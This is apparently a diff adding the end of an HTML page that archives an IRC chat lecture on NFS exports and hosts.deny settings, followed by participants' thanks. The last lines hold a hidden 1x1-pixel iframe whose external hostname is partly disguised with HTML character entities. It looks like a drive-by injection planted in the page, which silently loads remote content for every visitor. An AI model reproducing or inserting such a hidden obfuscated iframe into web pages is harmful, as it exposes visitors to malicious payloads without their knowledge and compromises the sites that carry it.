+<br><font color="#FF0000">*** Quits: Sh0ck3R (Ping timeout)</font>
+<br><b>&lt;Ghost_Rider> rpc.mountd: 192.168.0.0/24</b>
+<br><b>&lt;Ghost_Rider> rpc.nfsd: 192.168.0.0/24</b>
+<br><font color="#FF0000">*** Quits: jimi (Quit: BitchX-1.0c16 -- just
+do it.)</font>
+<br><b>&lt;Ghost_Rider> and on hosts.deny just ALL: ALL and would deny
+everything that isn't accepted</b>
+<br><font color="#FF0000">*** Joins: freerider</font>
+<br><b>&lt;Ghost_Rider> on /etc/exports you'll have the exports dir</b>
+<br><b>&lt;Ghost_Rider> and the hosts that could export it</b>
+<br><b>&lt;Ghost_Rider> for example /home&nbsp; HOSTNAME(rw)</b>
+<br><b>&lt;Ghost_Rider> the (rw) stands for read and write giving these
+permissions to HOSTNAME when he mounts /home</b>
+<br><b>&lt;Ghost_Rider> well I think this is done</b>
+<br><b>&lt;SteeLe></b> tired heh ?
+<br><font color="#FF0000">* DigitalFallout wakes up</font>
+<br><b>&lt;DigitalFallout></b> DId I miss anything?
+<br><b>&lt;Mikkkeee></b> man we all got to give it up for Rider
+<br><font color="#FF0000">*** Joins: _RooTs_</font>
+<br><font color="#FF0000">* DigitalFallout gives Ghost_Rider a "round of
+applause"</font>
+<br><font color="#FF0000">*** Mikkkeee sets mode: -m</font>
+<br><b>&lt;mikestevens></b> great job
+<br><b>&lt;Ghost_Rider> man I'm exausted..almost 2 hours...u guys killed
+me</b>
+<br><b>&lt;Ghost_Rider> thnx mike</b>
+<br><font color="#FF0000">* Ellis_D gives a standing ovacion</font>
+<br><b>&lt;DigitalFallout></b> That is like a BSRF lecture record
+<br><font color="#FF0000">* Mikkkeee gives Rider a "round of applause"</font>
+<br><b>&lt;Ghost_Rider> well guys I cutted some parts because this was
+already too extensive</b>
+<br><b>&lt;Ghost_Rider> thnx mikkkeee</b>
+<br><b>&lt;Ghost_Rider> glad that you guys liked</b>
+<br><b>&lt;Mikkkeee></b> hell yah
+<p><b>&lt;--------------End of lecture------------></b>
+<br>&nbsp;
+<br>&nbsp;
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
